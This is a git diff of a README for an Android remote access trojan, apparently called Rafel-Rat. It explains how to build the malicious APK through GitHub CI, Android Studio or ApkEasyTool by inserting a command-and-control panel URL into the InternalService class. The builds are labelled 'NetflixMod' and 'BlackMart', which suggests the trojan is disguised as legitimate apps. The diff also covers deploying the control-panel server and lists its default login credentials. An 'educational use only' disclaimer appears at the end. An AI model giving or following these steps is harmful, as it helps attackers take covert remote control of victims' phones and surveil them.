@@ -38,21 +38,32 @@
 OR
 
 - [ApkEasyTool](https://forum.xda-developers.com/android/software-hacking/tool-apk-easy-tool-v1-02-windows-gui-t3333960)
+
+OR
+
+- Github ci 
+
 ---  
-### Building Apk With Android Studio
+### Client Side Setup 
+There are several methods. You can choose any one.
 
-1.  Open Project ***NetflixMod*** in Android Studio 
-2.  Put the `command.php` link of server in InternalService.class class
+#### Building Apk With Github Ci
+1.  Fork this project
+2.  Put the `command.php` link of server in [InternalService.java](BlackMart/app/src/main/java/com/velociraptor/raptor/InternalService.java#L75) class
+3.  You will see released apk in **Actions** tab after some min
+
+#### Building Apk With Android Studio
+1.  Open Project ***BlackMart*** in Android Studio 
+2.  Put the `command.php` link of server in [InternalService.java](BlackMart/app/src/main/java/com/velociraptor/raptor/InternalService.java#L75) class
 3.  Build the Project
-4.  Zipalign and sign the Apk...
----
-### Building Apk with ApkEasyTool:
+4.  Sign and Zipalign the Apk
 
+#### Building Apk with ApkEasyTool:
 1. Unzip BlackMart(apktool).zip and  Navigate to ***\BlackMart\smali_classes2\com\velociraptor\raptor*** 
 2. Open InternalService.smali 
 3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
 ---
-### Building Server 
+### Server Side Setup 
 1. Upload Files in server Folder to Your HostingPanel
 2. Now Open login.php 
 3. Enter Username ***Hande*** Password ***Ercel***
@@ -90,6 +101,3 @@ Rafel-Rat is built for Educational and Internal use ONLY.</b>
 <a href=https://www.instagram.com/swagkarna><img src="https://img.shields.io/badge/Instagram-@swagkarna-purple?style=for-the-badge" /></a>
 
 ---    
-
-
-
